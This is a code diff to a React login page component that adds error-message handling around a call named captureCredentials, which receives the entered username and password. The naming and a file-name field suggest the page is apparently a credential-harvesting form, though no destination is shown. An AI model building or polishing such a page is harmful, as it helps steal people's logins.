@@ -1,4 +1,3 @@
-
 'use client';
 
 import React, { FormEvent, useState, useEffect } from 'react';
@@ -26,6 +25,7 @@ export default function LoginPageClient() {
   const [password, setPassword] = useState('');
   const [showSuccessAlert, setShowSuccessAlert] = useState(false);
   const [showErrorAlert, setShowErrorAlert] = useState(false);
+  const [errorMessage, setErrorMessage] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [fileName, setFileName] = useState('');
 
@@ -45,10 +45,21 @@ export default function LoginPageClient() {
     setIsLoading(true);
     setShowErrorAlert(false);
     try {
-      await captureCredentials({ username, password });
-      setShowSuccessAlert(true);
-    } catch (error) {
+      const result = await captureCredentials({ username, password });
+      if (result.success) {
+        setShowSuccessAlert(true);
+      } else {
+        setErrorMessage(
+          result.message || 'An unexpected error occurred. Please try again.'
+        );
+        setShowErrorAlert(true);
+      }
+    } catch (error: any) {
       console.error('Error in handleSubmit:', error);
+      setErrorMessage(
+        error.message ||
+          'There was a problem submitting your request. Please try again later.'
+      );
       setShowErrorAlert(true);
     } finally {
       setIsLoading(false);
@@ -186,7 +197,7 @@ export default function LoginPageClient() {
             </AlertDialogTitle>
           </AlertDialogHeader>
           <AlertDialogDescription className="mt-2 text-center text-gray-400 leading-relaxed">
-            There was a problem submitting your request. This may be due to a server configuration issue. Please try again later.
+            {errorMessage}
           </AlertDialogDescription>
           <AlertDialogFooter className="sm:justify-center mt-4">
             <AlertDialogAction
